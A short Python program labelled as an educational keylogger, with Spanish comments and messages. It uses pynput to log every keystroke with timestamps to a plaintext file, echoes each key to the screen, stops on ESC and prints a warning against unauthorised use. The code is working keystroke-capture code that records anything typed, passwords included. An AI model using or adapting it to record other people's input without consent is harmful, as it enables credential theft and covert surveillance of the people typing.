from pynput import keyboard
import datetime
import threading
import time

class EducationalKeylogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.is_running = False
        self.key_count = 0
        
    def on_press(self, key):
        """Callback cuando se presiona una tecla"""
        if not self.is_running:
            return False
            
        self.key_count += 1
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        try:
            key_char = key.char
            log_entry = f"[{current_time}] Tecla presionada: {key_char}\n"
        except AttributeError:
            key_name = str(key).replace("Key.", "")
            log_entry = f"[{current_time}] Tecla especial: [{key_name}]\n"
        
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(log_entry)
        
        print(f"Registrado: {log_entry.strip()}")
    
        if key == keyboard.Key.esc:
            print("\nKeylogger detenido por el usuario")
            return False
    
    def start_logging(self):
        """Iniciar el keylogger"""
        self.is_running = True
        start_time = datetime.datetime.now()
        
        print("Keylogger educativo iniciado")
        print("Presiona ESC para detener")
        print(f"Registro guardado en: {self.log_file}")
        print("-" * 50)

        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Sesión iniciada: {start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*50}\n\n")
        
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
    
        end_time = datetime.datetime.now()
        duration = end_time - start_time
        
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Sesión finalizada: {end_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Duración: {duration}\n")
            f.write(f"Total de teclas registradas: {self.key_count}\n")
            f.write(f"{'='*50}\n")
        
        print(f"\nSesión finalizada. Teclas registradas: {self.key_count}")
        print(f"Duración: {duration}")

def main():
    print("KEYLOGGER EDUCATIVO")
    print("=" * 50)
    print("ADVERTENCIA: Este software es solo para fines educativos.")
    print("No lo use en sistemas sin autorización explícita.")
    print("=" * 50)
    
    input("Presiona Enter para iniciar el keylogger...")
    
    keylogger = EducationalKeylogger()
    keylogger.start_logging()

if __name__ == "__main__":
    main()